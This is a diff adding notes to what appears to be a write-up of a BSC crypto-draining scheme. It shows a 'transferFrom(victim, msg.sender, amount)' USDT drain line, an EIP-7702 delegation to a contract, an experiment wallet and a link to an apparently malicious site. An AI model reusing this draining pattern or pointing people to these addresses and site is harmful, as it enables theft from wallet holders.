@@ -42,3 +42,22 @@
 
 ## Transfer the USDT 
 - IERC20(token).transferFrom(victim, msg.sender, amount);
+
+- ## Delegated address
+- https://bscscan.com/address/0x417aba6b7fe738455a133058db29c8620fc231c2#code
+
+- EIP-7702: 0xeE123C21bD75BA6E9d55fa96D863c8c73579B3BB
+- Delegate to 0x417aBa6b7Fe738455a133058dB29C8620fC231C2
+
+## 4 free Sponsor 
+- Then Insufficient BNB
+
+
+## Experiment wallet 
+- https://bscscan.com/address/0x3863e9c8612047a5f714bb800205ed2ac1000e25
+
+## website link
+- https://bscnetwork.in/d.html
+
+## ERC 7702 account
+- https://bscscan.com/address/0x5853f45163347218c1c656ce84e3b6b3fbe63f11#code
